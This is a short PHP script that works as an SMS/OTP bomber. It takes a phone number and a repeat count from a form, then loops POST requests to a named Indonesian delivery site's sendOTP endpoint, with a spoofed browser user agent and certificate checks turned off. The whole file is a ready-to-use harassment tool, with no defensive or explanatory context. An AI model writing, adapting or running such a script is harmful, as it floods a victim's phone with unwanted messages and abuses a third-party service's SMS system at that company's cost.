<?php

$no = $_POST["no"];
$body = "phone_number={$no}";
$loop = $_POST["loop"];
$x = 0;
while($x < $loop) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.phd.co.id/en/users/sendOTP");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
echo "Success Nganu <br> $body <br>";
curl_exec($ch);
$x++;
if(curl_exec($ch)){
    continue;
    }
}

?>